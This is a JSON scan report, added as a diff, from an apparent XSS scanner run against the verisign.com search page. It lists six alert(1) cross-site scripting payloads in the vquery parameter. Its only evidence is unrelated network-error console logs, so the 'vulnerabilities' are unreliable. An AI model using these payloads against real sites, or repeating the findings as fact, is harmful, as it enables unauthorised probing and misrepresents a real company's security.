@@ -1,0 +1,123 @@
+{
+  "scan_info": {
+    "target_url": "https://www.verisign.com/search/",
+    "timestamp": "2026-02-13T12:14:10.686778",
+    "scanner": "Advanced XSS Exploit Plugin",
+    "version": "1.0.0"
+  },
+  "summary": {
+    "total_vulnerabilities": 6,
+    "severity_breakdown": {
+      "high": 0,
+      "medium": 6,
+      "low": 0
+    },
+    "vulnerability_types": [
+      "dom"
+    ]
+  },
+  "findings": [
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%3Cinput+onfocus%3Dalert%281%29+autofocus%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/js/components/index.adef78706e6eca23e14267a764da9da280b8dc4e8ab4eae9152f6fbdf4babbf6.js 7:2105 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T12:05:26.395740"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "<textarea onfocus=alert(1) autofocus>",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://www.verisign.com/fonts/Inter-Regular-latin.2961762d625bd3a73fa9bdf3f1c897ec4a0ad5cf3e53490c69bc1c15ebf34087.woff2 - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/search/?vquery=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E 0:0 Uncaught DOMException: A network error occurred.",
+        "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://cdn.cookielaw.org/scripttemplates/202505.2.0/otBannerSdk.js - Failed to load resource: net::ERR_CONNECTION_RESET"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T12:06:05.846542"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "<keygen onfocus=alert(1) autofocus>",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://cdn.cookielaw.org/scripttemplates/202505.2.0/otBannerSdk.js - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/js/components/index.adef78706e6eca23e14267a764da9da280b8dc4e8ab4eae9152f6fbdf4babbf6.js 7:2105 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T12:06:23.188770"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%3Cvideo%3E%3Csource+onerror%3D%22alert%281%29%22%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://cdn.cookielaw.org/scripttemplates/otSDKStub.js - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://cdn.cookielaw.org/scripttemplates/otSDKStub.js - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/js/components/index.adef78706e6eca23e14267a764da9da280b8dc4e8ab4eae9152f6fbdf4babbf6.js 7:2105 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T12:06:58.523682"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%22+onmouseover%3D%22alert%281%29",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "\" onmouseover=\"alert(1)",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://cdn.cookielaw.org/scripttemplates/otSDKStub.js - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/fonts/Inter-Regular-latin.2961762d625bd3a73fa9bdf3f1c897ec4a0ad5cf3e53490c69bc1c15ebf34087.woff2 - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/search/?vquery=%22+onmouseover%3D%22alert%281%29 0:0 Uncaught DOMException: A network error occurred.",
+        "https://www.verisign.com/img/general/verisign_logo.min.e2353926dddcdf1d30390ecc21110351f6d9378b32501c3cb94fc7cbeedd4bb6.svg - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/sprites-general.min.663b3fd019d703f3c9af671cd0bc5cf5c3097d726c2616914d8a6fba0f76519b.svg#chevron_right - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://assets.adobedtm.com/1d6e8340b68d/700e249796ce/launch-305389a5b097.min.js - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/search/#?vquery=%22+onmouseover%3D%22alert%281%29 0:0 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T12:08:22.438795"
+    },
+    {
+      "type": "dom",
+      "url": "https://www.verisign.com/search/?vquery=%23%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "parameter": "vquery",
+      "method": "GET",
+      "payload": "#\"><script>alert(1)</script>",
+      "context": "dom",
+      "evidence": "Potential DOM XSS - Console errors detected",
+      "console_logs": [
+        "https://api-us1.cludo.com/api/v3/10000064/10000072/search - Failed to load resource: net::ERR_NETWORK_CHANGED",
+        "https://www.verisign.com/js/components/index.adef78706e6eca23e14267a764da9da280b8dc4e8ab4eae9152f6fbdf4babbf6.js 7:2105 Uncaught TypeError: Failed to fetch"
+      ],
+      "severity": "medium",
+      "timestamp": "2026-02-13T12:09:20.436183"
+    }
+  ]
+}
